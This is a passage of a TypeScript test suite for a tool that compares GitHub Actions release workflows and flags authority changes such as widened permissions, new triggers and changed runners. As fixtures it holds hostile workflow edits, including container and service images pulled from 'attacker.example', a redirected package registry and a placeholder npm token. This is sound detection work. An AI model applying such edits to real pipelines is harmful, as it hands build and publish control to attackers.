import { describe, expect, it } from "vitest";
import {
  type AuthorityBaselineRef,
  type AuthorityChange,
  type AuthorityChangeKind,
  computeReleaseAuthorityDelta,
} from "../server/lib/release-authority/delta";
import {
  type AuthorityArtifact,
  type AuthorityUnresolved,
  type ReleaseAuthoritySnapshot,
  buildReleaseAuthoritySnapshot,
} from "../server/lib/release-authority/snapshot";
import { parseWorkflowYaml } from "../server/lib/release-authority/yaml";

const ENTRY = ".github/workflows/release.yml";

// A workflow with the shape the PyPI gate documents: build uploads a candidate,
// a gated publish job downloads it and publishes with attestations.
const BASE_WORKFLOW = `
name: Release
on:
  push:
    tags:
      - "v*"

permissions:
  contents: read

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
      - run: python -m build
      - uses: actions/upload-artifact@v4
        with:
          name: pypi-release-candidate
          path: dist/
  publish:
    needs: build
    runs-on: ubuntu-latest
    environment: pypi
    permissions:
      id-token: write
      contents: read
    steps:
      - uses: actions/download-artifact@v4
        with:
          name: pypi-release-candidate
          path: dist/
      - uses: actions/attest-build-provenance@v2
      - uses: pypa/gh-action-pypi-publish@release/v1
`;

interface SnapshotOptions {
  workflows?: Array<{
    path: string;
    content: string;
    role?: "entry" | "referenced";
    sha?: string;
    localActionDigests?: Record<string, string>;
  }>;
  artifacts?: AuthorityArtifact[];
  unresolved?: AuthorityUnresolved[];
  /** `null` models a run GitHub reported no entry workflow path for. */
  workflowPath?: string | null;
}

function makeSnapshot(options: SnapshotOptions = {}): Promise<ReleaseAuthoritySnapshot> {
  const workflows = options.workflows ?? [{ path: ENTRY, content: BASE_WORKFLOW }];
  return buildReleaseAuthoritySnapshot({
    run: {
      repositoryFullName: "acme/widget",
      environment: "pypi",
      runId: 1234,
      runAttempt: 1,
      workflowPath: options.workflowPath === undefined ? ENTRY : options.workflowPath,
      headSha: "b".repeat(40),
      ref: "refs/tags/v1.0.0",
      event: "push",
      actor: "maintainer",
      triggeringActor: "maintainer",
    },
    workflows: workflows.map((workflow) => {
      const parsed = parseWorkflowYaml(workflow.content);
      return {
        path: workflow.path,
        repositoryFullName: "acme/widget",
        sha: workflow.sha ?? "c".repeat(40),
        ref: "refs/tags/v1.0.0",
        role: workflow.role ?? "entry",
        content: workflow.content,
        document: parsed.value,
        documentComplete: parsed.complete,
        localActionDigests: workflow.localActionDigests,
      };
    }),
    artifacts: options.artifacts ?? [
      { name: "widget-1.0.0-py3-none-any.whl", kind: "wheel", sha256: "a1" },
      { name: "widget-1.0.0.tar.gz", kind: "sdist", sha256: "a2" },
    ],
    unresolved: options.unresolved ?? [],
  });
}

const BASELINE_REF: AuthorityBaselineRef = {
  snapshotId: "snap-1",
  gateId: "gate-1",
  runId: 1000,
  headSha: "a".repeat(40),
  approvedAt: "2026-07-01T00:00:00.000Z",
};

async function deltaBetween(priorWorkflow: string, currentWorkflow: string) {
  const prior = await makeSnapshot({ workflows: [{ path: ENTRY, content: priorWorkflow }] });
  const current = await makeSnapshot({ workflows: [{ path: ENTRY, content: currentWorkflow }] });
  return computeReleaseAuthorityDelta(current, { snapshot: prior, ref: BASELINE_REF });
}

function kinds(changes: AuthorityChange[]): AuthorityChangeKind[] {
  return changes.map((change) => change.kind);
}

function find(changes: AuthorityChange[], kind: AuthorityChangeKind): AuthorityChange | undefined {
  return changes.find((change) => change.kind === kind);
}

describe("computeReleaseAuthorityDelta", () => {
  it("reports no_baseline for the first release on a boundary", async () => {
    const current = await makeSnapshot();
    const delta = computeReleaseAuthorityDelta(current, null);
    expect(delta.status).toBe("no_baseline");
    expect(delta.requiresApproval).toBe(false);
    expect(delta.changes).toEqual([]);
    expect(delta.baseline).toBeNull();
  });

  it("fails closed when the newest approved baseline is unreadable", async () => {
    const current = await makeSnapshot();
    const delta = computeReleaseAuthorityDelta(current, null, {
      unreadableBaseline: BASELINE_REF,
    });

    expect(delta).toMatchObject({
      status: "changed",
      baseline: BASELINE_REF,
      highestSignificance: "high",
      requiresApproval: true,
    });
    expect(delta.changes).toEqual([
      expect.objectContaining({ kind: "baseline_unreadable", significance: "high" }),
    ]);
  });

  it("reports unchanged when the authority is identical", async () => {
    const delta = await deltaBetween(BASE_WORKFLOW, BASE_WORKFLOW);
    expect(delta.status).toBe("unchanged");
    expect(delta.requiresApproval).toBe(false);
    expect(delta.highestSignificance).toBe("none");
    expect(delta.baseline).toEqual(BASELINE_REF);
  });

  it("fails closed when identical workflows inherit mutable repository permissions", async () => {
    const inherited = BASE_WORKFLOW.replace("permissions:\n  contents: read\n\n", "").replace(
      "    permissions:\n      id-token: write\n      contents: read\n",
      "",
    );
    const prior = await makeSnapshot({ workflows: [{ path: ENTRY, content: inherited }] });
    const current = await makeSnapshot({ workflows: [{ path: ENTRY, content: inherited }] });
    const delta = computeReleaseAuthorityDelta(current, {
      snapshot: prior,
      ref: BASELINE_REF,
    });

    expect(current.coverage).toEqual({
      complete: false,
      unresolved: [
        {
          path: `${ENTRY}/build -> repository default workflow permissions`,
          reason: "not_accessible",
        },
        {
          path: `${ENTRY}/publish -> repository default workflow permissions`,
          reason: "not_accessible",
        },
      ],
    });
    expect(delta).toMatchObject({ status: "changed", requiresApproval: true });
    expect(find(delta.changes, "coverage_incomplete")).toMatchObject({
      significance: "medium",
      scope: "coverage",
    });
  });

  it("keeps permission coverage complete when every job has an explicit block", async () => {
    const perJob = BASE_WORKFLOW.replace("permissions:\n  contents: read\n\n", "").replace(
      "  build:\n    runs-on: ubuntu-latest\n",
      "  build:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n",
    );

    const snapshot = await makeSnapshot({ workflows: [{ path: ENTRY, content: perJob }] });

    expect(snapshot.coverage).toEqual({ complete: true, unresolved: [] });
  });

  it("detects a publish command split across shell continuation lines", async () => {
    const prior = BASE_WORKFLOW.replace(
      "      - uses: pypa/gh-action-pypi-publish@release/v1\n",
      "      - run: echo safe\n",
    );
    const current = BASE_WORKFLOW.replace(
      "      - uses: pypa/gh-action-pypi-publish@release/v1\n",
      `      - run: |
          npm \\
            publish
`,
    );

    const delta = await deltaBetween(prior, current);

    expect(delta.status).toBe("changed");
    expect(delta.requiresApproval).toBe(true);
    expect(find(delta.changes, "publish_step_added")).toMatchObject({
      significance: "high",
      after: expect.stringMatching(/^npm publish \[sha256:[0-9a-f]{64}\]$/),
    });
  });

  it("never persists raw publish or safeguard command text", async () => {
    const token = `npm_${"a".repeat(32)}`;
    const workflow = BASE_WORKFLOW.replace(
      "      - uses: pypa/gh-action-pypi-publish@release/v1\n",
      `      - run: npm publish --provenance --//registry.npmjs.org/:_authToken=${token}\n`,
    );

    const snapshot = await makeSnapshot({ workflows: [{ path: ENTRY, content: workflow }] });
    const serialized = JSON.stringify(snapshot);

    expect(snapshot.publishSteps).toEqual([
      expect.objectContaining({
        kind: "run",
        detail: expect.stringMatching(/^npm publish \[sha256:[0-9a-f]{64}\]$/),
      }),
    ]);
    expect(snapshot.safeguards).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          kind: "provenance",
          detail: expect.stringMatching(/^provenance flag \[sha256:[0-9a-f]{64}\]$/),
        }),
      ]),
    );
    expect(serialized).not.toContain(token);
    expect(serialized).not.toContain("_authToken");
  });

  it("records only explicit safeguards on recognized publisher actions", async () => {
    const workflow = `
on: push
jobs:
  publish:
    runs-on: ubuntu-latest
    steps:
      - uses: pypa/gh-action-pypi-publish@release/v1
        with:
          Attestations: TRUE
      - uses: js-devtools/npm-publish@v3
        with:
          provenance: "true"
`;

    const snapshot = await makeSnapshot({ workflows: [{ path: ENTRY, content: workflow }] });

    expect(snapshot.safeguards).toEqual([
      expect.objectContaining({ kind: "attestation", detail: "with.attestations=true" }),
      expect.objectContaining({ kind: "provenance", detail: "with.provenance=true" }),
    ]);
  });

  it("does not expose or infer safeguard semantics from arbitrary action inputs", async () => {
    const privateValue = "private-attestation-policy";
    const workflow = `
on: push
jobs:
  publish:
    runs-on: ubuntu-latest
    steps:
      - uses: pypa/gh-action-pypi-publish@release/v1
        with:
          attestations: ${privateValue}
      - uses: acme/unrelated-action@v1
        with:
          attestations: true
          provenance: true
`;

    const snapshot = await makeSnapshot({ workflows: [{ path: ENTRY, content: workflow }] });
    const serialized = JSON.stringify(snapshot);

    expect(snapshot.safeguards).toEqual([]);
    expect(serialized).not.toContain(privateValue);
  });

  it("treats GitHub's same-repository reusable-workflow path forms as pinned equivalents", async () => {
    const priorWorkflow = `
on: workflow_dispatch
permissions:
  contents: read
jobs:
  release:
    uses: ./.github/workflows/reusable.yml
`;
    const currentWorkflow = priorWorkflow.replace("./.github", "$/.github");
    const current = await makeSnapshot({
      workflows: [{ path: ENTRY, content: currentWorkflow }],
    });
    const delta = await deltaBetween(priorWorkflow, currentWorkflow);

    expect(current.actions).toEqual([
      expect.objectContaining({
        uses: "$/.github/workflows/reusable.yml",
        ref: null,
        pinned: true,
      }),
    ]);
    expect(delta.standing.mutableRefs).toEqual([]);
    expect(delta.status).toBe("cosmetic");
    expect(delta.requiresApproval).toBe(false);
  });

  it("treats comment, ordering and formatting edits as cosmetic", async () => {
    const edited = `# Release pipeline, rewritten for clarity.
${BASE_WORKFLOW.replace("name: Release", 'name: "Release"').replace(
  "  build:",
  "  # builds the distributions\n  build:",
)}`;
    const delta = await deltaBetween(BASE_WORKFLOW, edited);
    expect(delta.status).toBe("cosmetic");
    expect(delta.requiresApproval).toBe(false);
    expect(delta.highestSignificance).toBe("low");
    expect(kinds(delta.changes)).toEqual(["workflow_content_changed"]);
  });

  it("treats workflow, job, and step display labels as cosmetic", async () => {
    const prior = BASE_WORKFLOW.replace(
      "  publish:\n    needs: build\n",
      "  publish:\n    name: Publish package\n    needs: build\n",
    ).replace(
      "      - uses: pypa/gh-action-pypi-publish@release/v1\n",
      "      - name: Publish to PyPI\n        uses: pypa/gh-action-pypi-publish@release/v1\n",
    );
    const current = prior
      .replace("name: Release", "name: Public release")
      .replace("name: Publish package", "name: Release package")
      .replace("name: Publish to PyPI", "name: Upload distribution");

    const delta = await deltaBetween(prior, current);

    expect(delta.status).toBe("cosmetic");
    expect(kinds(delta.changes)).toEqual(["workflow_content_changed"]);
  });

  it("fails closed when an unclassified parsed workflow field changes", async () => {
    const prior = BASE_WORKFLOW.replace(
      "permissions:\n",
      "future-execution-control: strict\n\npermissions:\n",
    );
    const current = prior.replace(
      "future-execution-control: strict",
      "future-execution-control: relaxed",
    );

    const delta = await deltaBetween(prior, current);

    expect(delta).toMatchObject({ status: "changed", requiresApproval: true });
    expect(find(delta.changes, "workflow_authority_changed")).toMatchObject({
      significance: "medium",
      subject: expect.stringContaining("execution controls"),
    });
    expect(kinds(delta.changes)).not.toContain("workflow_content_changed");
  });

  it("keeps an unclassified semantic change beside a categorized edit", async () => {
    const prior = BASE_WORKFLOW.replace(
      "permissions:\n  contents: read",
      "future-execution-control: strict\n\npermissions:\n  contents: write",
    );
    const current = prior
      .replace("future-execution-control: strict", "future-execution-control: relaxed")
      .replace("permissions:\n  contents: write", "permissions:\n  contents: read");

    const delta = await deltaBetween(prior, current);

    expect(find(delta.changes, "permission_narrowed")).toBeDefined();
    expect(find(delta.changes, "workflow_authority_changed")).toMatchObject({
      significance: "medium",
      subject: expect.stringContaining("execution controls"),
    });
  });

  it("treats order-insensitive permission key reordering as cosmetic", async () => {
    const prior = BASE_WORKFLOW.replace(
      "permissions:\n  contents: read\n\njobs:",
      "permissions:\n  contents: read\n  id-token: none\n\njobs:",
    );
    const current = BASE_WORKFLOW.replace(
      "permissions:\n  contents: read\n\njobs:",
      "permissions:\n  id-token: none\n  contents: read\n\njobs:",
    );

    const delta = await deltaBetween(prior, current);

    expect(delta.status).toBe("cosmetic");
    expect(kinds(delta.changes)).toEqual(["workflow_content_changed"]);
  });

  it("treats redundant explicit none permissions as cosmetic", async () => {
    const explicitNone = BASE_WORKFLOW.replace(
      "permissions:\n  contents: read\n",
      "permissions:\n  contents: read\n  issues: none\n",
    );

    const delta = await deltaBetween(BASE_WORKFLOW, explicitNone);

    expect(delta.status).toBe("cosmetic");
    expect(delta.requiresApproval).toBe(false);
    expect(kinds(delta.changes)).toEqual(["workflow_content_changed"]);
  });

  it("treats an all-none permission map like an explicit empty block", async () => {
    const empty = BASE_WORKFLOW.replace("permissions:\n  contents: read\n", "permissions: {}\n");
    const allNone = BASE_WORKFLOW.replace(
      "permissions:\n  contents: read\n",
      "permissions:\n  contents: none\n  issues: none\n",
    );

    const delta = await deltaBetween(empty, allNone);

    expect(delta.status).toBe("cosmetic");
    expect(delta.requiresApproval).toBe(false);
    expect(kinds(delta.changes)).toEqual(["workflow_content_changed"]);
  });

  it("does not treat a long authority value changed past its display bound as cosmetic", async () => {
    const prefix = `npm publish --tag ${"x".repeat(320)}`;
    const prior = BASE_WORKFLOW.replace(
      "      - uses: pypa/gh-action-pypi-publish@release/v1\n",
      `      - run: ${prefix}-stable\n`,
    );
    const current = prior.replace(`${prefix}-stable`, `${prefix}-latest`);

    const delta = await deltaBetween(prior, current);

    expect(delta.status).toBe("changed");
    expect(delta.requiresApproval).toBe(true);
    expect(kinds(delta.changes)).toContain("workflow_authority_changed");
    expect(kinds(delta.changes)).not.toContain("workflow_content_changed");
  });

  it("does not treat a changed step id as cosmetic when later steps consume its outputs", async () => {
    const prior = BASE_WORKFLOW.replace(
      "      - run: python -m build\n",
      `      - id: package
        run: echo "path=dist" >> "$GITHUB_OUTPUT"
      - run: echo "\${{ steps.package.outputs.path }}"
`,
    );
    const current = prior.replace("      - id: package\n", "      - id: renamed-package\n");

    const delta = await deltaBetween(prior, current);

    expect(delta.status).toBe("changed");
    expect(delta.requiresApproval).toBe(true);
    expect(kinds(delta.changes)).toContain("workflow_authority_changed");
    expect(kinds(delta.changes)).not.toContain("workflow_content_changed");
  });

  it.each([
    {
      label: "job condition",
      prior: BASE_WORKFLOW.replace(
        "  publish:\n    needs: build\n",
        "  publish:\n    if: github.ref_type == 'tag'\n    needs: build\n",
      ),
      current: BASE_WORKFLOW.replace(
        "  publish:\n    needs: build\n",
        "  publish:\n    if: always()\n    needs: build\n",
      ),
    },
    {
      label: "job dependency",
      prior: BASE_WORKFLOW,
      current: BASE_WORKFLOW.replace("    needs: build\n", "    needs: bootstrap\n"),
    },
    {
      label: "workflow concurrency cancellation",
      prior: BASE_WORKFLOW.replace(
        "permissions:\n",
        "concurrency:\n  group: release\n  cancel-in-progress: false\n\npermissions:\n",
      ),
      current: BASE_WORKFLOW.replace(
        "permissions:\n",
        "concurrency:\n  group: release\n  cancel-in-progress: true\n\npermissions:\n",
      ),
    },
    {
      label: "job concurrency group",
      prior: BASE_WORKFLOW.replace(
        "  publish:\n    needs: build\n",
        "  publish:\n    concurrency: public-release\n    needs: build\n",
      ),
      current: BASE_WORKFLOW.replace(
        "  publish:\n    needs: build\n",
        "  publish:\n    concurrency: internal-release\n    needs: build\n",
      ),
    },
    {
      label: "job timeout",
      prior: BASE_WORKFLOW.replace(
        "    runs-on: ubuntu-latest\n    environment: pypi",
        "    runs-on: ubuntu-latest\n    timeout-minutes: 10\n    environment: pypi",
      ),
      current: BASE_WORKFLOW.replace(
        "    runs-on: ubuntu-latest\n    environment: pypi",
        "    runs-on: ubuntu-latest\n    timeout-minutes: 120\n    environment: pypi",
      ),
    },
    {
      label: "step timeout",
      prior: BASE_WORKFLOW.replace(
        "      - uses: pypa/gh-action-pypi-publish@release/v1\n",
        "      - uses: pypa/gh-action-pypi-publish@release/v1\n        timeout-minutes: 10\n",
      ),
      current: BASE_WORKFLOW.replace(
        "      - uses: pypa/gh-action-pypi-publish@release/v1\n",
        "      - uses: pypa/gh-action-pypi-publish@release/v1\n        timeout-minutes: 120\n",
      ),
    },
    {
      label: "job runner selection",
      prior: BASE_WORKFLOW,
      current: BASE_WORKFLOW.replace(
        "    runs-on: ubuntu-latest\n    environment: pypi",
        "    runs-on: self-hosted\n    environment: pypi",
      ),
    },
    {
      label: "job container",
      prior: BASE_WORKFLOW.replace(
        "  build:\n    runs-on: ubuntu-latest\n",
        "  build:\n    runs-on: ubuntu-latest\n    container: node:22\n",
      ),
      current: BASE_WORKFLOW.replace(
        "  build:\n    runs-on: ubuntu-latest\n",
        "  build:\n    runs-on: ubuntu-latest\n    container: attacker.example/build:latest\n",
      ),
    },
    {
      label: "job service",
      prior: BASE_WORKFLOW.replace(
        "  build:\n    runs-on: ubuntu-latest\n",
        "  build:\n    runs-on: ubuntu-latest\n    services:\n      registry:\n        image: registry:2\n",
      ),
      current: BASE_WORKFLOW.replace(
        "  build:\n    runs-on: ubuntu-latest\n",
        "  build:\n    runs-on: ubuntu-latest\n    services:\n      registry:\n        image: attacker.example/registry:latest\n",
      ),
    },
    {
      label: "job output mapping",
      prior: BASE_WORKFLOW.replace(
        "  build:\n    runs-on: ubuntu-latest\n",
        "  build:\n    runs-on: ubuntu-latest\n    outputs:\n      registry: stable\n",
      ),
      current: BASE_WORKFLOW.replace(
        "  build:\n    runs-on: ubuntu-latest\n",
        "  build:\n    runs-on: ubuntu-latest\n    outputs:\n      registry: attacker-controlled\n",
      ),
    },
    {
      label: "job environment mapping",
      prior: BASE_WORKFLOW.replace(
        "    environment: pypi\n",
        "    environment: pypi\n    env:\n      NPM_CONFIG_REGISTRY: https://registry.npmjs.org\n",
      ),
      current: BASE_WORKFLOW.replace(
        "    environment: pypi\n",
        "    environment: pypi\n    env:\n      NPM_CONFIG_REGISTRY: https://packages.example.test\n",
      ),
    },
    {
      label: "workflow environment mapping",
      prior: BASE_WORKFLOW.replace(
        "permissions:\n",
        "env:\n  NPM_CONFIG_REGISTRY: https://registry.npmjs.org\n\npermissions:\n",
      ),
      current: BASE_WORKFLOW.replace(
        "permissions:\n",
        "env:\n  NPM_CONFIG_REGISTRY: https://packages.example.test\n\npermissions:\n",
      ),
    },
    {
      label: "publish-step condition",
      prior: BASE_WORKFLOW.replace(
        "      - uses: pypa/gh-action-pypi-publish@release/v1\n",
        "      - if: github.ref_type == 'tag'\n        uses: pypa/gh-action-pypi-publish@release/v1\n",
      ),
      current: BASE_WORKFLOW.replace(
        "      - uses: pypa/gh-action-pypi-publish@release/v1\n",
        "      - if: always()\n        uses: pypa/gh-action-pypi-publish@release/v1\n",
      ),
    },
    {
      label: "preceding shell command",
      prior: BASE_WORKFLOW.replace(
        "      - uses: pypa/gh-action-pypi-publish@release/v1\n",
        "      - run: npm config set registry https://registry.npmjs.org\n      - uses: pypa/gh-action-pypi-publish@release/v1\n",
      ),
      current: BASE_WORKFLOW.replace(
        "      - uses: pypa/gh-action-pypi-publish@release/v1\n",
        "      - run: npm config set registry https://packages.example.test\n      - uses: pypa/gh-action-pypi-publish@release/v1\n",
      ),
    },
    {
      label: "job strategy matrix",
      prior: BASE_WORKFLOW.replace(
        "  publish:\n    needs: build\n",
        "  publish:\n    needs: build\n    strategy:\n      matrix:\n        registry: [https://registry.npmjs.org]\n",
      ).replace(
        "      - uses: pypa/gh-action-pypi-publish@release/v1\n",
        "      - uses: pypa/gh-action-pypi-publish@release/v1\n        with:\n          repository-url: ${{ matrix.registry }}\n",
      ),
      current: BASE_WORKFLOW.replace(
        "  publish:\n    needs: build\n",
        "  publish:\n    needs: build\n    strategy:\n      matrix:\n        registry: [https://packages.example.test]\n",
      ).replace(
        "      - uses: pypa/gh-action-pypi-publish@release/v1\n",
        "      - uses: pypa/gh-action-pypi-publish@release/v1\n        with:\n          repository-url: ${{ matrix.registry }}\n",
      ),
    },
    {
      label: "non-blocking safeguard",
      prior: BASE_WORKFLOW.replace(
        "      - uses: actions/attest-build-provenance@v2\n",
        "      - uses: actions/attest-build-provenance@v2\n        continue-on-error: false\n",
      ),
      current: BASE_WORKFLOW.replace(
        "      - uses: actions/attest-build-provenance@v2\n",
        "      - uses: actions/attest-build-provenance@v2\n        continue-on-error: true\n",
      ),
    },
    {
      label: "background safeguard",
      prior: BASE_WORKFLOW.replace(
        "      - uses: actions/attest-build-provenance@v2\n",
        "      - id: attest\n        uses: actions/attest-build-provenance@v2\n        background: false\n",
      ),
      current: BASE_WORKFLOW.replace(
        "      - uses: actions/attest-build-provenance@v2\n",
        "      - id: attest\n        uses: actions/attest-build-provenance@v2\n        background: true\n",
      ),
    },
    {
      label: "background-step synchronization",
      prior: BASE_WORKFLOW.replace(
        "      - uses: pypa/gh-action-pypi-publish@release/v1\n",
        "      - wait: attest\n      - uses: pypa/gh-action-pypi-publish@release/v1\n",
      ),
      current: BASE_WORKFLOW.replace(
        "      - uses: pypa/gh-action-pypi-publish@release/v1\n",
        "      - cancel: attest\n      - uses: pypa/gh-action-pypi-publish@release/v1\n",
      ),
    },
    {
      label: "parallel step group",
      prior: BASE_WORKFLOW.replace(
        "      - uses: actions/attest-build-provenance@v2\n",
        "      - parallel:\n          - uses: actions/attest-build-provenance@v2\n          - run: npm audit\n",
      ),
      current: BASE_WORKFLOW.replace(
        "      - uses: actions/attest-build-provenance@v2\n",
        "      - parallel:\n          - uses: actions/attest-build-provenance@v1\n          - run: npm audit\n",
      ),
    },
    {
      label: "publish working directory",
      prior: BASE_WORKFLOW.replace(
        "      - uses: pypa/gh-action-pypi-publish@release/v1\n",
        "      - run: npm publish\n        working-directory: packages/public\n",
      ),
      current: BASE_WORKFLOW.replace(
        "      - uses: pypa/gh-action-pypi-publish@release/v1\n",
        "      - run: npm publish\n        working-directory: packages/internal\n",
      ),
    },
    {
      label: "publish step shell",
      prior: BASE_WORKFLOW.replace(
        "      - uses: pypa/gh-action-pypi-publish@release/v1\n",
        "      - shell: bash\n        run: npm publish\n",
      ),
      current: BASE_WORKFLOW.replace(
        "      - uses: pypa/gh-action-pypi-publish@release/v1\n",
        "      - shell: bash {0}\n        run: npm publish\n",
      ),
    },
    {
      label: "job default working directory",
      prior: BASE_WORKFLOW.replace(
        "  publish:\n    needs: build\n",
        "  publish:\n    defaults:\n      run:\n        working-directory: packages/public\n    needs: build\n",
      ),
      current: BASE_WORKFLOW.replace(
        "  publish:\n    needs: build\n",
        "  publish:\n    defaults:\n      run:\n        working-directory: packages/internal\n    needs: build\n",
      ),
    },
    {
      label: "workflow default working directory",
      prior: BASE_WORKFLOW.replace(
        "permissions:\n",
        "defaults:\n  run:\n    working-directory: packages/public\n\npermissions:\n",
      ),
      current: BASE_WORKFLOW.replace(
        "permissions:\n",
        "defaults:\n  run:\n    working-directory: packages/internal\n\npermissions:\n",
      ),
    },
  ])("does not call a changed $label cosmetic", async ({ prior, current }) => {
    const delta = await deltaBetween(prior, current);

    expect(delta.status).toBe("changed");
    expect(delta.requiresApproval).toBe(true);
    expect(find(delta.changes, "workflow_authority_changed")).toMatchObject({
      significance: "medium",
      scope: ENTRY,
    });
    expect(kinds(delta.changes)).not.toContain("workflow_content_changed");
  });

  it("keeps an execution-control change visible beside a categorized change", async () => {
    const prior = BASE_WORKFLOW.replace(
      "  publish:\n    needs: build\n",
      "  publish:\n    if: github.ref_type == 'tag'\n    needs: build\n",
    );
    const current = prior
      .replace("github.ref_type == 'tag'", "always()")
      .replace("permissions:\n  contents: read", "permissions:\n  contents: write");
    const delta = await deltaBetween(prior, current);

    expect(find(delta.changes, "permission_widened")).toMatchObject({
      scope: ENTRY,
      subject: "contents",
    });
    expect(find(delta.changes, "workflow_authority_changed")).toMatchObject({
      scope: ENTRY,
      subject:
        "conditions, dependencies, environment mappings, commands, action ordering, or execution controls",
    });
  });

  it("flags a widened permission", async () => {
    const delta = await deltaBetween(
      BASE_WORKFLOW,
      BASE_WORKFLOW.replace("      contents: read\n", "      contents: write\n"),
    );
    expect(delta.status).toBe("changed");
    expect(delta.requiresApproval).toBe(true);
    const change = find(delta.changes, "permission_widened");
    expect(change).toMatchObject({
      significance: "high",
      scope: `${ENTRY}/publish`,
      subject: "contents",
      before: "read",
      after: "write",
    });
  });

  it("does not flag a narrowed permission as high signal", async () => {
    const widened = BASE_WORKFLOW.replace("      contents: read\n", "      contents: write\n");
    const delta = await deltaBetween(widened, BASE_WORKFLOW);
    expect(find(delta.changes, "permission_narrowed")?.significance).toBe("low");
    expect(delta.highestSignificance).toBe("low");
  });

  it("flags removing the permissions block as a widening to the repository default", async () => {
    const withJobPermissionsOnly = BASE_WORKFLOW.replace("permissions:\n  contents: read\n\n", "");
    const withoutBlock = withJobPermissionsOnly.replace(
      "    permissions:\n      id-token: write\n      contents: read\n",
      "",
    );
    const delta = await deltaBetween(withJobPermissionsOnly, withoutBlock);
    expect(find(delta.changes, "permission_block_removed")).toMatchObject({
      significance: "high",
      scope: `${ENTRY}/publish`,
      after: "repository default",
    });
    // The individual scopes inside a removed block are not re-reported.
    expect(kinds(delta.changes)).not.toContain("permission_removed");
  });

  it("does not treat permissions from a deleted job as a repository-default widening", async () => {
    const jobPermissionsOnly = BASE_WORKFLOW.replace("permissions:\n  contents: read\n\n", "")
      .replace(
        "  build:\n    runs-on: ubuntu-latest\n",
        "  build:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n",
      )
      .replace(
        "  publish:\n",
        "  audit:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n    steps:\n      - run: echo audit\n  publish:\n",
      );
    const withoutAudit = jobPermissionsOnly.replace(/  audit:\n(?:    .*\n)+?(?=  publish:)/, "");

    const delta = await deltaBetween(jobPermissionsOnly, withoutAudit);

    expect(delta.changes).not.toContainEqual(
      expect.objectContaining({
        kind: "permission_block_removed",
        scope: `${ENTRY}/audit`,
      }),
    );
    expect(find(delta.changes, "workflow_authority_changed")).toBeDefined();
  });

  it("compares a removed job block with inherited workflow permissions", async () => {
    const inherited = BASE_WORKFLOW.replace(
      "    permissions:\n      id-token: write\n      contents: read\n",
      "",
    );

    const delta = await deltaBetween(BASE_WORKFLOW, inherited);

    expect(find(delta.changes, "permission_removed")).toMatchObject({
      significance: "low",
      scope: `${ENTRY}/publish`,
      subject: "id-token",
      before: "write",
      after: null,
    });
    expect(kinds(delta.changes)).not.toContain("permission_block_removed");
  });

  it("treats removing a job block identical to workflow permissions as cosmetic", async () => {
    const redundant = BASE_WORKFLOW.replace(
      "permissions:\n  contents: read\n",
      "permissions:\n  id-token: write\n  contents: read\n",
    );
    const inherited = redundant.replace(
      "    permissions:\n      id-token: write\n      contents: read\n",
      "",
    );

    const delta = await deltaBetween(redundant, inherited);

    expect(delta.status).toBe("cosmetic");
    expect(delta.requiresApproval).toBe(false);
    expect(kinds(delta.changes)).toEqual(["workflow_content_changed"]);
  });

  it("treats an explicit permissions allowlist becoming read-all as a widening", async () => {
    const readAll = BASE_WORKFLOW.replace(
      "    permissions:\n      id-token: write\n      contents: read\n",
      "    permissions: read-all\n",
    );
    const delta = await deltaBetween(BASE_WORKFLOW, readAll);

    expect(delta.highestSignificance).toBe("high");
    expect(delta.changes).toContainEqual(
      expect.objectContaining({
        kind: "permission_widened",
        significance: "high",
        scope: `${ENTRY}/publish`,
        subject: "unlisted scopes",
        before: "none",
        after: "read",
      }),
    );
  });

  it("flags a newly added dangerous trigger above an ordinary one", async () => {
    const dispatch = await deltaBetween(
      BASE_WORKFLOW,
      BASE_WORKFLOW.replace('      - "v*"\n', '      - "v*"\n  workflow_dispatch:\n'),
    );
    expect(find(dispatch.changes, "trigger_added")).toMatchObject({
      significance: "high",
      subject: "workflow_dispatch",
    });

    const release = await deltaBetween(
      BASE_WORKFLOW,
      BASE_WORKFLOW.replace('      - "v*"\n', '      - "v*"\n  release:\n    types: [published]\n'),
    );
    expect(find(release.changes, "trigger_added")).toMatchObject({
      significance: "medium",
      subject: "release",
    });
  });

  it("flags a trigger that lost every filter as widened", async () => {
    const unfiltered = BASE_WORKFLOW.replace('  push:\n    tags:\n      - "v*"\n', "  push:\n");
    const delta = await deltaBetween(BASE_WORKFLOW, unfiltered);
    expect(find(delta.changes, "trigger_filter_widened")).toMatchObject({
      significance: "high",
      subject: "push",
      before: "tags=[v*]",
      after: "(unfiltered)",
    });
  });

  it("preserves order-sensitive positive and negative trigger patterns", async () => {
    const prior = BASE_WORKFLOW.replace(
      '    tags:\n      - "v*"\n',
      '    branches:\n      - "releases/**"\n      - "!releases/**-alpha"\n',
    );
    const current = prior.replace(
      '      - "releases/**"\n      - "!releases/**-alpha"\n',
      '      - "!releases/**-alpha"\n      - "releases/**"\n',
    );
    const delta = await deltaBetween(prior, current);

    expect(find(delta.changes, "trigger_filter_changed")).toMatchObject({
      subject: "push",
      before: "branches=[releases/**,!releases/**-alpha]",
      after: "branches=[!releases/**-alpha,releases/**]",
    });
    expect(delta.requiresApproval).toBe(true);
  });

  it("distinguishes long trigger filters that differ after the display bound", async () => {
    const sharedPatterns = Array.from(
      { length: 24 },
      (_, index) => `      - "release/${String(index).padStart(2, "0")}/**"`,
    ).join("\n");
    const prior = BASE_WORKFLOW.replace(
      '    tags:\n      - "v*"\n',
      `    branches:\n${sharedPatterns}\n      - "!release/private/**"\n`,
    );
    const current = prior
      .replace('      - "!release/private/**"\n', "")
      .replace("      contents: read", "      contents: write");

    const delta = await deltaBetween(prior, current);
    const triggerChange = find(delta.changes, "trigger_filter_changed");

    expect(triggerChange).toMatchObject({ subject: "push" });
    expect(triggerChange?.before).toMatch(/ \[sha256:[0-9a-f]{64}\]$/);
    expect(triggerChange?.after).toMatch(/ \[sha256:[0-9a-f]{64}\]$/);
    expect(triggerChange?.before).not.toBe(triggerChange?.after);
    expect(find(delta.changes, "permission_widened")).toBeDefined();
  });

  it("flags a changed workflow_run workflow selector", async () => {
    const prior = BASE_WORKFLOW.replace(
      '  push:\n    tags:\n      - "v*"\n',
      '  workflow_run:\n    workflows: ["Trusted build"]\n    types: [completed]\n',
    );
    const current = prior.replace("Trusted build", "Untrusted build");
    const delta = await deltaBetween(prior, current);

